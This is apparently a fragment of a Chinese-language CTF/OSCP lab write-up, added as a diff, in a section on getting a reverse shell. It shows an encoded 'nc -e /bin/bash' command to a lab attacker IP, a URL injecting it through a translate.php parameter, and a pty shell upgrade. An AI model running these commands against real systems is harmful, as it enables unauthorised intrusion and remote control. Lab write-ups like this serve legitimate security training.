@@ -45,3 +45,14 @@ print(output_text)
 ```
 
 # 反弹SHELL
+```C
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ python translater.py nc+-e+/bin/bash+192.168.44.128+9001
+nc+-e+/bin/bash+192.168.44.128+9001
+mx -v /yrm/yzhs 192.168.44.128 9001
+```
+访问`http://192.168.44.134/translate.php?hmv=rw;mx -v /yrm/yzhs 192.168.44.128 9001
+
+```C
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
